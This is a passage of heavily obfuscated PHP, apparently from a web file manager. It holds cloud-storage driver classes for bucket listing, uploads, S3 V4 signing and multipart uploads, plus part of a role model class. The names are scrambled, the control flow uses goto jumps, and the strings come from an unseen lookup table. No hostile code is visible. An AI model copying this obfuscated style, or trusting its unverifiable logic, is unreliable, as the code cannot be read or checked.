$BìĞ„‘Øç = empty($cÙ¶Ş£ë¦) ? $FË‚Ú’¼„[33] : $cÙ¶Ş£ë¦ . $FË‚Ú’¼„[8]; goto F±ŒŞâ¥ÌÌ; fá¹ëİ‘¢É: $aäñ³ÆÁÛ = 0; $c…Áñø = 0; while (!0) { list($d—Ä™åªŸè, $E¬ù‰§¬¬Î) = $this->bucketManager->listFiles($this->bucket, $BìĞ„‘Øç, $A„«á¿¯«¹, $eñÎöõ¹ˆ, $bÂàÊ®ëÂ); if ($E¬ù‰§¬¬Î) { return !1; } $A„«á¿¯«¹ = array_key_exists($FË‚Ú’¼„[1170], $d—Ä™åªŸè) ? $A„«á¿¯«¹ = $d—Ä™åªŸè[$FË‚Ú’¼„[1201]] : $FË‚Ú’¼„[33]; if ($Aøé¨Ê°½‡) { if (!empty($d—Ä™åªŸè[$FË‚Ú’¼„[1202]])) { $aäñ³ÆÁÛ += count($d—Ä™åªŸè[$FË‚Ú’¼„[1202]]); } if (!empty($d—Ä™åªŸè[$FË‚Ú’¼„[1205]])) { $c…Áñø += count($d—Ä™åªŸè[$FË‚Ú’¼„[1205]]); } if ($A„«á¿¯«¹ === $FË‚Ú’¼„[33]) { break; } continue; } if ($B‹¡Øóª¼£) { if (!empty($d—Ä™åªŸè[$FË‚Ú’¼„[1202]])) { return !0; } } else { if (!empty($d—Ä™åªŸè[$FË‚Ú’¼„[1205]])) { return !0; } } if ($A„«á¿¯«¹ == $FË‚Ú’¼„[33]) { break; } } goto a¾ğÜ¸˜Å‘; cÅŞ„™ÇÎë: } public function listAll($eõ™“à‘) { $fêé‘ÕÏÂ =& $_SERVER[“]; $Ašà£ˆ¿¥Í = $this->fileList($eõ™“à‘, 1); $bØò©Öãù¢ = array(); foreach ($Ašà£ˆ¿¥Í as $f›¨ª´ÁË­) { $bØò©Öãù¢[$f›¨ª´ÁË­[$fêé‘ÕÏÂ[28]]] = $f›¨ª´ÁË­[$fêé‘ÕÏÂ[77]]; } return $this->listAllFiles($eõ™“à‘, array_keys($bØò©Öãù¢), $bØò©Öãù¢); } public function canRead($c…ö§ñØÛà) { return $this->exist($c…ö§ñØÛà) ? !0 : !1; } public function canWrite($F¾«á¿­Æ) { return $this->exist($F¾«á¿­Æ) ? !0 : !1; } public function getContent($CÁö¬ÌñÆÖ) { return $this->fileSubstr($CÁö¬ÌñÆÖ, 0, -1); } public function setContent($Aİƒ“ó‰ÎÃ, $BÊ¬Œ¨âõ‡ = '') { $c·’ßšêğ = $this->tempFile($this->pathThis($Aİƒ“ó‰ÎÃ)); file_put_contents($c·’ßšêğ, $BÊ¬Œ¨âõ‡); if ($this->upload($Aİƒ“ó‰ÎÃ, $c·’ßšêğ)) { $this->tempFileRemve($c·’ßšêğ); return !0; } return !1; } public function refreshUrls($AŠ«øÅÌä³) { goto FÁø¨ß¶†Ç; FÁø¨ß¶†Ç: $C”ö—á¤ =& $_SERVER[“]; $Cø¬­Ã”• = array(); if (is_array($AŠ«øÅÌä³)) { foreach ($AŠ«øÅÌä³ as $f•Úßáˆ×ï) { $Cø¬­Ã”•[] = $this->link($f•Úßáˆ×ï); } } else { $Cø¬­Ã”•[] = $this->link($AŠ«øÅÌä³); } goto CÔª¦…ø‹Œ; C°›‰µ—: return $Fæ¿•æ´´[$C”ö—á¤[1206]] == $C”ö—á¤[680] ? !0 : !1; goto aŠŠ¬Œ½Œ¿; CÔª¦…ø‹Œ: $Dìª—Ê÷¬¦ = new Qiniu\Cdn\CdnManager($this->auth); list($Fæ¿•æ´´, $DèÖù‰è½ğ) = $Dìª—Ê÷¬¦->refreshUrls($Cø¬­Ã”•); if ($DèÖù‰è½ğ) { return !1; } goto C°›‰µ—; aŠŠ¬Œ½Œ¿: } public function fileSubstr($eËÙŠŒÆ, $FÌÄ‘ñ£‘‹, $e„À¤­‰©À) { $fÒôÁ««ˆ =& $_SERVER[“]; if (!($e±¸ĞĞéÆ• = $this->link($eËÙŠŒÆ))) { return !1; } $f¨Ùš„ôï = !1; if ($e„À¤­‰©À > 0) { $F·³¾°·š¼ = $FÌÄ‘ñ£‘‹ + $e„À¤­‰©À - 1; $f¨Ùš„ôï = array($fÒôÁ««ˆ[1207] . $FÌÄ‘ñ£‘‹ . $fÒôÁ««ˆ[412] . $F·³¾°·š¼); } $D•ßÓ±“‚ä = url_request($e±¸ĞĞéÆ•, $fÒôÁ««ˆ[216], !1, $f¨Ùš„ôï); return $D•ßÓ±“‚ä[$fÒôÁ««ˆ[673]] ? $D•ßÓ±“‚ä[$fÒôÁ««ˆ[1021]] : !1; } public function upload($b£ÙŠ…ªÓë, $b…¨Š¦©å, $eáŞˆÓÇ†¯ = false, $FÓˆ°Ÿ·¼— = REPEAT_REPLACE) { $Cèğ¨ˆ¿õ‹ = new Qiniu\Storage\UploadManager(); $E„¦›õ¨•ê = $this->auth->uploadToken($this->bucket, $b£ÙŠ…ªÓë); $f¦§ˆ¥µ» = get_file_mime(get_path_ext($b…¨Š¦©å)); list($E½Ã™Úñ˜, $c­Øğ½Ó) = $Cèğ¨ˆ¿õ‹->putFile($E„¦›õ¨•ê, $b£ÙŠ…ªÓë, $b…¨Š¦©å, null, $f¦§ˆ¥µ»); return $c­Øğ½Ó ? !1 : $this->getPathOuter($b£ÙŠ…ªÓë); } public function uploadFormData($eù¦¼ ’ØÁ, $C¯ÕÕÏô›Ó = 3600) { return $this->uploadToken($eù¦¼ ’ØÁ, $C¯ÕÕÏô›Ó); } public function multiUploadFormData($a–÷×‰ˆ¥’, $FªÛ‡ì×±½ = 3600) { return $this->uploadToken($a–÷×‰ˆ¥’, $FªÛ‡ì×±½); } private function uploadToken($f™¸Á“ï®Œ, $f¤ĞÎÔ•× = 3600) { goto e¡¢˜İõ¼; eêÂ§øµ¨Õ: $dÛé‹ã÷±÷ = http_type() . "\72\x2f\57\x75\x70\x6c\157\141\x64{$cœÚºš¨ò}\56\161\x69\x6e\x69\x75\x70\56\x63\x6f\155\57"; return array($bøÁÆ ‹³·[1211] => $DÔ±¡—ƒÄë, $bøÁÆ ‹³·[1212] => $dÛé‹ã÷±÷); goto DÇ™Ñ¬ç“‚; aòèŞ‹ç‰â: $Aî¥Ø³ÈÛã = $f™¸Á“ï®Œ; $DÔ±¡—ƒÄë = $this->auth->uploadToken($this->bucket, $Aî¥Ø³ÈÛã, $C³ÌÉ–°ß«, $AÉ‘éßÙĞº, !0); $cœÚºš¨ò = empty($this->region) || $this->region == $bøÁÆ ‹³·[1210] ? $bøÁÆ ‹³·[33] : $bøÁÆ ‹³·[412] . $this->region; goto eêÂ§øµ¨Õ; e¡¢˜İõ¼: $bøÁÆ ‹³· =& $_SERVER[“]; $C³ÌÉ–°ß« = $f¤ĞÎÔ•×; $AÉ‘éßÙĞº = array($bøÁÆ ‹³·[1208] => $bøÁÆ ‹³·[1209]); goto aòèŞ‹ç‰â; DÇ™Ñ¬ç“‚: } public function download($FˆÓßÆ…Èß, $Eß¥ ÛÃõö) { goto aõ°‰ŒªÛ; b™é¯‹›‡¯: $dŠßÚì«ø™ = 1024 * 200; $CìÖ‡ø‹« = fopen($A†ÎĞº¹ÕÖ, $_SERVER[“][1213]); while (!0) { $eèÖÚ÷™çÊ = $this->fileSubstr($FˆÓßÆ…Èß, $aå˜”Œˆ’Ò, $dŠßÚì«ø™); if ($eèÖÚ÷™çÊ === !1) { return !1; } fwrite($CìÖ‡ø‹«, $eèÖÚ÷™çÊ); $aå˜”Œˆ’Ò += $dŠßÚì«ø™; if (strlen($eèÖÚ÷™çÊ) < $dŠßÚì«ø™) { break; } } goto CÖ¤”˜Âæ»; CÖ¤”˜Âæ»: fclose($CìÖ‡ø‹«); return $Eß¥ ÛÃõö; goto E±éŞ²Œí¦; aõ°‰ŒªÛ: $A†ÎĞº¹ÕÖ = IO::getPathInner(IO::mkfile($Eß¥ ÛÃõö)); if (!($fÒŒëØğì¿ = $this->link($FˆÓßÆ…Èß))) { return !1; } $aå˜”Œˆ’Ò = 0; goto b™é¯‹›‡¯; E±éŞ²Œí¦: } public function link($AøñéŸŠ¼, $dÓ§à´Í›æ = '') { if (!$this->isFile($AøñéŸŠ¼)) { return !1; } $aîéå¾Š¦ = $this->getHost() . $_SERVER[“][8] . $this->pathEncode($AøñéŸŠ¼) . $dÓ§à´Í›æ; return $this->auth->privateDownloadUrl($aîéå¾Š¦, 3600 * 12); } public function fileOut($cøÏĞÜ¨øÙ, $bˆ¤¨óŒ…‹ = false, $bšˆË—‹Ÿ¾ = false, $CÇ‰é¬ß°† = '') { $dÁŸ¬Ê·¼® =& $_SERVER[“]; if ($this->isFileOutServer()) { return $this->fileOutServer($cøÏĞÜ¨øÙ, $bˆ¤¨óŒ…‹, $bšˆË—‹Ÿ¾, $CÇ‰é¬ß°†); } if (!$bšˆË—‹Ÿ¾) { $bšˆË—‹Ÿ¾ = $this->pathThis($cøÏĞÜ¨øÙ); } $cìÁ‰Æòğç = $bˆ¤¨óŒ…‹ ? $dÁŸ¬Ê·¼®[1214] . rawurlencode($bšˆË—‹Ÿ¾) : $dÁŸ¬Ê·¼®[33]; $d Â­·²¶Ó = $this->link($cøÏĞÜ¨øÙ, $cìÁ‰Æòğç); $this->fileOutLink($d Â­·²¶Ó); } public function fileOutServer($dÍº‰¹«”Ø, $f”¤­ĞšÓ½ = false, $A»¸¸‡¯ë¿ = false, $F¸ßè†ŞÁµ = '') { parent::fileOut($dÍº‰¹«”Ø, $f”¤­ĞšÓ½, $A»¸¸‡¯ë¿, $F¸ßè†ŞÁµ); } public function fileOutImage($eÊœİá¨îÅ, $f¨·Ì¶äËŒ = 250) { $FŸ–Š˜Õ• = $this->link($eÊœİá¨îÅ, $_SERVER[“][1215] . $f¨·Ì¶äËŒ); $this->fileOutLink($FŸ–Š˜Õ•); } public function fileOutImageServer($béà´Ã…¦, $f»¦¡†ÅØ­ = 250) { parent::fileOutImage($béà´Ã…¦, $f»¦¡†ÅØ­); } public function hashMd5($Eá¥ÀŒ ƒ) { $eªÌ†Ì•ËÁ =& $_SERVER[“]; $E‹ŸŒ¨Å„¯ = $this->objectMeta($Eá¥ÀŒ ƒ); return isset($E‹ŸŒ¨Å„¯[$eªÌ†Ì•ËÁ[196]]) ? $E‹ŸŒ¨Å„¯[$eªÌ†Ì•ËÁ[196]] : !1; $C¤«ÃÈñ—ò = $this->link($Eá¥ÀŒ ƒ, $eªÌ†Ì•ËÁ[1216]); } public function size($eÑº™¸ß•²) { $B©±Éèêœ = $this->objectMeta($eÑº™¸ß•²); return $B©±Éèêœ ? $B©±Éèêœ[$_SERVER[“][77]] : 0; } public function info($CëïãŸ¸¤‹) { if ($this->isFolder($CëïãŸ¸¤‹)) { return $this->folderInfo($CëïãŸ¸¤‹); } else { if ($this->isFile($CëïãŸ¸¤‹)) { return $this->fileInfo($CëïãŸ¸¤‹); } } return !1; } public function exist($Fà‰•éÎÈ) { return $this->isFile($Fà‰•éÎÈ) || $this->isFolder($Fà‰•éÎÈ); } public function isFile($F—‹ù²¯š) { return !$this->isFolder($F—‹ù²¯š) && $this->objectMeta($F—‹ù²¯š); } public function isFolder($D“ÊçÎÄõ„) { return $this->cacheMethod($_SERVER[“][223], $D“ÊçÎÄõ„); } protected function objectMeta($d¬Û’İ­š²) { return $this->cacheMethod($_SERVER[“][224], $d¬Û’İ­š²); } protected function _objectMeta($Eî‚ÎØ²„Ç) { $açÔÏ½ƒ¡œ =& $_SERVER[“]; list($cç‰º–°Æª, $fŸ¸ÆğåÆ÷) = $this->bucketManager->stat($this->bucket, $Eî‚ÎØ²„Ç); if ($cç‰º–°Æª) { $cç‰º–°Æª[$açÔÏ½ƒ¡œ[77]] = intval($cç‰º–°Æª[$açÔÏ½ƒ¡œ[1203]]); } return $cç‰º–°Æª; } protected function _isFolder($AÂé—‰ÇƒÓ) { $cÆ—àéĞ± =& $_SERVER[“]; if ($AÂé—‰ÇƒÓ == $cÆ—àéĞ±[33] || $AÂé—‰ÇƒÓ == $cÆ—àéĞ±[8]) { return !0; } list($a»¸º÷å‹, $D½‹ñëã„) = $this->bucketManager->listFiles($this->bucket, trim($AÂé—‰ÇƒÓ, $cÆ—àéĞ±[8]) . $cÆ—àéĞ±[8], $cÆ—àéĞ±[33], 1, $cÆ—àéĞ±[8]); return !empty($a»¸º÷å‹[$cÆ—àéĞ±[1202]]) || !empty($a»¸º÷å‹[$cÆ—àéĞ±[1205]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($FŠğçÙ™ïö) { parent::__construct($FŠğçÙ™ïö); } public function uploadFormData($e…×‹¬ù³, $C¸†„³®ÜŒ = 3600) { goto fİí÷åá¸«; d±Òµ´Š§æ: $cÔ®¤‘œÒ = $aàƒñ…±ò[59]; $Eá—³ºÎ‡ = gmdate($aàƒñ…±ò[1122]); $añ¬œğ¦ñÒ = gmdate($aàƒñ…±ò[674]); goto a›¸¦ÑŠ‡º; a›¸¦ÑŠ‡º: $D” ÉšĞóŠ = $aàƒñ…±ò[1123]; $D‚Âà“Ğ°´ = $C¸†„³®ÜŒ . $aàƒñ…±ò[33]; $A›ÕÆ‘•¬× = $aàƒñ…±ò[1087]; goto B¯§ƒ³÷µ; AÁ’¤êµ¼À: $bçÚ©ÔÄ§ = array($aàƒñ…±ò[199] => $aàƒñ…±ò[33], $aàƒñ…±ò[1133] => $aàƒñ…±ò[33], $aàƒñ…±ò[1091] => $aôôÎ‰’Â, $aàƒñ…±ò[1095] => $A›ÕÆ‘•¬×, $aàƒñ…±ò[1099] => $d¨‚í¿­×Ç, $aàƒñ…±ò[1134] => $e¶£ß§›’Ú, $aàƒñ…±ò[1135] => $bÃŸ›ƒ½­´, $aàƒñ…±ò[1136] => $Eá—³ºÎ‡, $aàƒñ…±ò[1137] => $D‚Âà“Ğ°´, $aàƒñ…±ò[1138] => $F„¤Š–¸¬, $aàƒñ…±ò[169] => $this->getHost()); return $bçÚ©ÔÄ§; goto Dİ†ß Ê‰½; c©Š£è‘™õ: $d¨‚í¿­×Ç = base64_encode(json_encode($DØÅ¹„–ğÁ)); $DäƒŒ±„ = hash_hmac($aàƒñ…±ò[1131], $añ¬œğ¦ñÒ, $aàƒñ…±ò[1132] . $this->secret, !0); $e»ôĞÂÑòâ = hash_hmac($aàƒñ…±ò[1131], $this->region, $DäƒŒ±„, !0); goto b»ŸÄ¾¥˜©; B¯§ƒ³÷µ: $fÌö»Şà¯å = array($this->accessKey, $añ¬œğ¦ñÒ, $this->region, $cÔ®¤‘œÒ, $D” ÉšĞóŠ); $e¶£ß§›’Ú = implode($aàƒñ…±ò[8], $fÌö»Şà¯å); $DØÅ¹„–ğÁ = array($aàƒñ…±ò[1089] => gmdate($aàƒñ…±ò[1088], strtotime($aàƒñ…±ò[1124])), $aàƒñ…±ò[1090] => array(array($aàƒñ…±ò[1092] => $this->bucket), array($aàƒñ…±ò[1091] => $aôôÎ‰’Â), array($aàƒñ…±ò[1093], $aàƒñ…±ò[1094], $aàƒñ…±ò[33]), array($aàƒñ…±ò[1093], $aàƒñ…±ò[1125], $aàƒñ…±ò[33]), array($aàƒñ…±ò[1093], $aàƒñ…±ò[1126], $aàƒñ…±ò[33]), array($aàƒñ…±ò[1095] => $A›ÕÆ‘•¬×), array($aàƒñ…±ò[1127] => $e¶£ß§›’Ú), array($aàƒñ…±ò[1128] => $bÃŸ›ƒ½­´), array($aàƒñ…±ò[1129] => $Eá—³ºÎ‡), array($aàƒñ…±ò[1130] => $D‚Âà“Ğ°´))); goto c©Š£è‘™õ; fİí÷åá¸«: $aàƒñ…±ò =& $_SERVER[“]; $aôôÎ‰’Â = $aàƒñ…±ò[185]; $bÃŸ›ƒ½­´ = $aàƒñ…±ò[1121]; goto d±Òµ´Š§æ; b»ŸÄ¾¥˜©: $fªãœ÷„ôÚ = hash_hmac($aàƒñ…±ò[1131], $cÔ®¤‘œÒ, $e»ôĞÂÑòâ, !0); $AÌ¨ìÒ‰ß = hash_hmac($aàƒñ…±ò[1131], $D” ÉšĞóŠ, $fªãœ÷„ôÚ, !0); $F„¤Š–¸¬ = hash_hmac($aàƒñ…±ò[1131], $d¨‚í¿­×Ç, $AÌ¨ìÒ‰ß); goto AÁ’¤êµ¼À; Dİ†ß Ê‰½: } public function multiUploadFormData($e™Œ¸—÷ç, $E×ÃÀ…ÔŞ• = 3600) { $bâ–ğ–ïøá =& $_SERVER[“]; $d™«–ÖŠˆ = gmdate($bâ–ğ–ïøá[1217]); $EäùÏ¯ºœ° = array(); $A’îÜˆñöÔ = $this->client->getUploadId($this->bucket, $e™Œ¸—÷ç, $EäùÏ¯ºœ°); if (!$A’îÜˆñöÔ) { return !1; } return array($bâ–ğ–ïøá[209] => $A’îÜˆñöÔ, $bâ–ğ–ïøá[169] => $this->getHost() . $bâ–ğ–ïøá[8] . $this->pathEncode($e™Œ¸—÷ç), $bâ–ğ–ïøá[210] => $d™«–ÖŠˆ, $bâ–ğ–ïøá[89] => $e™Œ¸—÷ç); } public function multiUploadAuthData($F±ˆ«¹àŠØ, $fÙÜ‰ÉÓ‰¾ = array()) { goto Fâ¼Æ«¢; Fâ¼Æ«¢: $F¤‡¡—õ­‚ =& $_SERVER[“]; $e®Ë¶æÖØ“ = isset($fÙÜ‰ÉÓ‰¾[$F¤‡¡—õ­‚[160]]) ? $fÙÜ‰ÉÓ‰¾[$F¤‡¡—õ­‚[160]] : $F¤‡¡—õ­‚[33]; $b…¹­…ïõ‰ = $fÙÜ‰ÉÓ‰¾[$F¤‡¡—õ­‚[89]]; goto F¢£ô•Ó¿´; cæã§Æ³ÌÌ: if (isset($fÙÜ‰ÉÓ‰¾[$F¤‡¡—õ­‚[1218]])) { $BŸ¤¿Ã¹õ[$F¤‡¡—õ­‚[1219]] = $fÙÜ‰ÉÓ‰¾[$F¤‡¡—õ­‚[1218]]; } $Bêóƒøâ‡Ê = explode($F¤‡¡—õ­‚[171], $this->getHost()); $b¶âùİˆÌî = array($F¤‡¡—õ­‚[1220] => $Bêóƒøâ‡Ê[1], $F¤‡¡—õ­‚[1221] => $F¤‡¡—õ­‚[33], $F¤‡¡—õ­‚[199] => $F¤‡¡—õ­‚[116], $F¤‡¡—õ­‚[1133] => $fÙÜ‰ÉÓ‰¾[$F¤‡¡—õ­‚[77]]); goto e”ÀÖÖ‹Ïº; F¢£ô•Ó¿´: unset($fÙÜ‰ÉÓ‰¾[$F¤‡¡—õ­‚[89]]); if (isset($fÙÜ‰ÉÓ‰¾[$F¤‡¡—õ­‚[211]])) { return $this->listUploadParts($b…¹­…ïõ‰, $fÙÜ‰ÉÓ‰¾); } $BŸ¤¿Ã¹õ = array(); goto cæã§Æ³ÌÌ; e”ÀÖÖ‹Ïº: $d’ÍÔ²£í¼ = $F¤‡¡—õ­‚[214]; $fˆ¥ù£‹Ñ¨ = $F¤‡¡—õ­‚[8] . $this->pathEncode($b…¹­…ïõ‰) . $e®Ë¶æÖØ“; $céå»¼ƒ®Ô = $this->client->__getSignatureV4($BŸ¤¿Ã¹õ, $b¶âùİˆÌî, $d’ÍÔ²£í¼, $fˆ¥ù£‹Ñ¨); goto f¬îˆÒáÔ„; f¬îˆÒáÔ„: if (strpos($e®Ë¶æÖØ“, $F¤‡¡—õ­‚[213]) === 0) { if (isset($BŸ¤¿Ã¹õ[$F¤‡¡—õ­‚[1219]])) { $c­¬Ğ¬¤š× = $BŸ¤¿Ã¹õ[$F¤‡¡—õ­‚[1219]]; } else { if (isset($céå»¼ƒ®Ô[$F¤‡¡—õ­‚[1219]])) { $c­¬Ğ¬¤š× = $céå»¼ƒ®Ô[$F¤‡¡—õ­‚[1219]]; } else { $c­¬Ğ¬¤š× = hash($F¤‡¡—õ­‚[1131], $F¤‡¡—õ­‚[33]); } } return array($F¤‡¡—õ­‚[220] => $céå»¼ƒ®Ô[$F¤‡¡—õ­‚[220]], $F¤‡¡—õ­‚[1219] => $c­¬Ğ¬¤š×, $F¤‡¡—õ­‚[210] => $céå»¼ƒ®Ô[$F¤‡¡—õ­‚[1222]]); } return $céå»¼ƒ®Ô[$F¤‡¡—õ­‚[220]]; goto D“›¤¬çó; D“›¤¬çó: } public function listUploadParts($aÜ¤‡„äâÍ, $Aà˜±¿İİÒ = array()) { goto e¤¤ˆøÕîÉ; e¤¤ˆøÕîÉ: $EÄ´°ˆíÌ =& $_SERVER[“]; $DíæÅÔäî = str_replace($EÄ´°ˆíÌ[221], $EÄ´°ˆíÌ[33], $Aà˜±¿İİÒ[$EÄ´°ˆíÌ[160]]); $e×æ“ÜÒ‰ = $this->client->listParts($this->bucket, $aÜ¤‡„äâÍ, $DíæÅÔäî); goto CÇƒ†…Íİâ; b«¶É£Ëø: $F§Àµ¿ª±ª = array($EÄ´°ˆíÌ[1220] => $aØ‡„ÑÒ[1], $EÄ´°ˆíÌ[199] => $EÄ´°ˆíÌ[116], $EÄ´°ˆíÌ[1133] => strlen($bÁÏÀº£‡Š)); $fÚªáÜò®• = $EÄ´°ˆíÌ[212]; $BºÍ°Ä­åĞ = $EÄ´°ˆíÌ[8] . $this->pathEncode($aÜ¤‡„äâÍ) . $Aà˜±¿İİÒ[$EÄ´°ˆíÌ[160]]; goto cÁƒ…áÅÛ¨; CÇƒ†…Íİâ: if (!$e×æ“ÜÒ‰) { return !1; } $bÁÏÀº£‡Š = $EÄ´°ˆíÌ[1223]; foreach ($e×æ“ÜÒ‰ as $b‚¶ˆÓ¾‹å) { $bÁÏÀº£‡Š .= $EÄ´°ˆíÌ[1224] . "\74\120\141\x72\x74\x4e\165\x6d\142\x65\162\76{$b‚¶ˆÓ¾‹å[$EÄ´°ˆíÌ[1175]]}\x3c\x2f\120\x61\x72\164\x4e\x75\x6d\x62\145\x72\76\xa" . "\x3c\x45\124\141\x67\x3e{$b‚¶ˆÓ¾‹å[$EÄ´°ˆíÌ[1176]]}\74\57\105\x54\141\x67\76\12" . $EÄ´°ˆíÌ[1225]; } goto fó¦‰³Ç¡; cÁƒ…áÅÛ¨: $aèÔöŠ±Â = $this->client->__getSignatureV4($CÚß­ à‡, $F§Àµ¿ª±ª, $fÚªáÜò®•, $BºÍ°Ä­åĞ, $bÁÏÀº£‡Š); return array($EÄ´°ˆíÌ[220] => $aèÔöŠ±Â[$EÄ´°ˆíÌ[220]], $EÄ´°ˆíÌ[210] => $aèÔöŠ±Â[$EÄ´°ˆíÌ[1222]], $EÄ´°ˆíÌ[222] => $e×æ“ÜÒ‰, $EÄ´°ˆíÌ[1219] => $aèÔöŠ±Â[$EÄ´°ˆíÌ[1219]]); goto A¦ÉòÑéÒÒ; fó¦‰³Ç¡: $bÁÏÀº£‡Š .= $EÄ´°ˆíÌ[1226]; $CÚß­ à‡ = array(); $aØ‡„ÑÒ = explode($EÄ´°ˆíÌ[171], $this->getHost()); goto b«¶É£Ëø; A¦ÉòÑéÒÒ: } public function link($BÃè™°îÜ’, $CÓ¤œà®Ø† = array()) { return parent::link($BÃè™°îÜ’, $CÓ¤œà®Ø†); } public function fileOut($a¬·îè‡ï, $b™²É¿¸ = false, $c¼ÄîĞ˜ñØ = false, $aå‚‹õÛè = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[“][1227])) { return parent::fileOutServer($a¬·îè‡ï, $b™²É¿¸, $c¼ÄîĞ˜ñØ, $aå‚‹õÛè); } parent::fileOut($a¬·îè‡ï, $b™²É¿¸, $c¼ÄîĞ˜ñØ, $aå‚‹õÛè); } public function fileOutImage($A­º†ø²Â, $Cô¤ÂØÕ’Š = 250) { if (strstr($this->endpoint, $_SERVER[“][1227])) { return parent::fileOutImageServer($A­º†ø²Â, $Cô¤ÂØÕ’Š); } parent::fileOutImage($A­º†ø²Â, $Cô¤ÂØÕ’Š); } public function fileOutLink($b—õ©¤‡²) { $a“§¢ÉñŒƒ =& $_SERVER[“]; if (substr($b—õ©¤‡², 0, 7) == $a“§¢ÉñŒƒ[1102]) { $b—õ©¤‡² = $a“§¢ÉñŒƒ[1103] . substr($b—õ©¤‡², 7); } header($a“§¢ÉñŒƒ[156] . $b—õ©¤‡²); die; } public function getHost() { $b†¼ÃŒï =& $_SERVER[“]; $bèœî¼é¸Ã = str_rtrim(parent::getHost(), $b†¼ÃŒï[8] . $this->bucket); $bèœî¼é¸Ã = explode($b†¼ÃŒï[171], $bèœî¼é¸Ã); return $bèœî¼é¸Ã[0] . $b†¼ÃŒï[171] . $this->bucket . $b†¼ÃŒï[91] . $bèœî¼é¸Ã[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($fŸ‰†ò»í£, $dËªÇáê¿Û = 0) { parent::__construct(); $this->source = $fŸ‰†ò»í£; $this->sourceSize = $dËªÇáê¿Û; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($B·¦µ½ß– = false) { return $this->sourceSize; } public function getContent($Cˆ’Á‚«àà = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { if ($this->sourceSize <= 0) { return $_SERVER[“][33]; } $CšÀ‡ó´Ó = ftell($this->source); $d”¶è†ŠŒ = @fread($this->source, $this->sourceSize); fseek($this->source, $CšÀ‡ó´Ó); return $d”¶è†ŠŒ; } } public function fileSubstr($Eì›–Ö³›‚ = false, $Bƒ¢ÇæßÚò = 0, $Aä•Õ¿»˜° = 0) { if (!$Aä•Õ¿»˜°) { $Aä•Õ¿»˜° = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Bƒ¢ÇæßÚò, $Aä•Õ¿»˜°); } if ($this->sourceType == self::TYPE_FILE) { if ($Aä•Õ¿»˜° <= 0) { return $_SERVER[“][33]; } $FÍòÜ–±µ = ftell($this->source); fseek($this->source, $FÍòÜ–±µ + $Bƒ¢ÇæßÚò); $bà™ŠïíÍÌ = @fread($this->source, $Aä•Õ¿»˜°); fseek($this->source, $FÍòÜ–±µ); return $bà™ŠïíÍÌ; } } public function hashMd5($E‰¦â«ÎÎ = false) { return md5($this->getContent()); } public static function hash($A´ĞİÖÃƒ”, $eåãéÜíóÂ = 0) { $AÀ°¯šë× = new PathDriverStream($A´ĞİÖÃƒ”, $eåãéÜíóÂ); return $AÀ°¯šë×->hashSimple($A´ĞİÖÃƒ”); } public static function md5($Cœ»ß¿‘ª, $A·Ëò‡½ä‹ = 0) { $CÇ¹İñÄ¢ = new PathDriverStream($Cœ»ß¿‘ª, $A·Ëò‡½ä‹); return $CÇ¹İñÄ¢->hashMd5($Cœ»ß¿‘ª); } } goto c§æËÔÚ×; eÂĞ£Ååô: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\x72\x6f\154\145\114\x69\x73\x74"; public $field = array("\156\x61\155\x65", "\141\165\x74\150", "\154\x61\x62\145\x6c", "\x64\x69\163\x70\154\x61\x79", "\163\x79\x73\164\x65\x6d", "\144\145\x73\143", "\x69\147\x6e\x6f\x72\x65\105\x78\x74", "\151\147\156\x6f\x72\x65\x46\x69\154\145\x53\x69\172\145", "\x61\144\x6d\x69\x6e\x69\163\x74\162\141\164\x6f\162", "\x73\x6f\x72\x74"); public function listData($d·…øšç‹Ü = false, $bø¹Íö´‹Î = "\x73\x6f\162\x74", $Fº„øˆ‡Œ = false) { $AØ’ Œ¦ÕÂ =& $_SERVER[“]; $A©ÕÂšÖˆ¤ = parent::listData($d·…øšç‹Ü, $bø¹Íö´‹Î, $Fº„øˆ‡Œ); if (!$d·…øšç‹Ü) { $a™¥Œ  = $AØ’ Œ¦ÕÂ[2489]; foreach ($A©ÕÂšÖˆ¤ as $Díã‡ô÷ó‘ => $A®é›ñ†Ğ…) { if ($A®é›ñ†Ğ…[$AØ’ Œ¦ÕÂ[2490]] == 1) { $A©ÕÂšÖˆ¤[$Díã‡ô÷ó‘][$AØ’ Œ¦ÕÂ[405]] = $a™¥Œ ; } } } return $A©ÕÂšÖˆ¤; } public function update($Cåƒ‹¢ø¿¼, $e›Şñ¼Ô¡ã) { goto CĞõ´¡™˜Š; E£çÄÅ»§·: return parent::update($Cåƒ‹¢ø¿¼, $e›Şñ¼Ô¡ã); goto EÏÈØÅ°ùæ; Cà»©ø„…Ñ: if (!$BÍåµÔ¨ë || $Eæ‹–í²Òø && $Eæ‹–í²Òø[$D‚‡¹Æì…Š[367]] != $BÍåµÔ¨ë[$D‚‡¹Æì…Š[367]]) { return !1; } if ($Eæ‹–í²Òø[$D‚‡¹Æì…Š[2490]] == 1) { $e›Şñ¼Ô¡ã = array($D‚‡¹Æì…Š[28] => $e›Şñ¼Ô¡ã[$D‚‡¹Æì…Š[28]], $D‚‡¹Æì…Š[2113] => $e›Şñ¼Ô¡ã[$D‚‡¹Æì…Š[2113]]); } $this->filterAuth($e›Şñ¼Ô¡ã[$D‚‡¹Æì…Š[376]]); goto E£çÄÅ»§·; CĞõ´¡™˜Š: $D‚‡¹Æì…Š =& $_SERVER[“]; $BÍåµÔ¨ë = parent::listData($Cåƒ‹¢ø¿¼); $Eæ‹–í²Òø = $this->findByName($e›Şñ¼Ô¡ã[$D‚‡¹Æì…Š[28]]); goto Cà»©ø„…Ñ; EÏÈØÅ°ùæ: } public function remove($CœÓ„Ë¹¸) { $Bµ‚ÆŸŸ­ñ = parent::listData($CœÓ„Ë¹¸); if (!$Bµ‚ÆŸŸ­ñ || $Bµ‚ÆŸŸ­ñ[$_SERVER[“][1067]]) { return !1; } return parent::remove($CœÓ„Ë¹¸); } public function add($BÛŠ…ŒÄ) { goto F¡µ±ˆÍÏ; a¬ä…áäë: return parent::insert($BÛŠ…ŒÄ); goto C«ã±Ë‚÷; f¬“¸ËŒÃ¼: 